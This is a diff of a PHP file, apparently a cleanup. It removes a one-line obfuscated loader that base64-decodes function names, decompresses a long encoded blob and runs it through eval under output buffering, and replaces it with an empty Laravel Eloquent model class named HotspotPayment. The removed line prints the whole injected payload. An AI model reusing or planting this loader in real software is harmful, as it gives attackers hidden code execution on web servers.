@@ -1,1 +1,11 @@
-<?php $_='076727bc';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNplUU2PgjAQve+v4GBSSfZQlnWVEA4L0oomGFEpcDHbFsUPkCyrIr9+q+KK2Tm005n33kxnJOlmrcXDDMB7DGrdGAK9dQvk3+vsZwn0F6mBNyQQKNqREj8LJ4YBpEf6rmcIF7DUhzwYHhzL3PEUFSPLWwZKLx+fLiTpWXQhSVcS/Srij/cFj9mex0D/12J/snettJOI6hXDaBNNTZMNTDYj2jYiZTU+wVF/kivsbb6akrLgRMlpimDkl3YYeEmYokr4iGKt5MQ/cFTikLiQqsM8Clw2xajyUrThWDvHs8K1Mr8SNYYUlwolu4PQ2AW2l3CM1mHgCt8vqIqUiHRgYCvHCPtF3cOGCi12Nh2qeqJXDc4x6tBLTTGQeODtaOpVTs0R+K7428qxPldc6Dp2kjAYJaHqHVm2FblcE3mjsYvGuK93u37J1+01YrJ+R16DbXA5wesf/HkRtU67OXdZ1n8BpnGnJQ=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class HotspotPayment extends Model
+{
+    use HasFactory;
+}
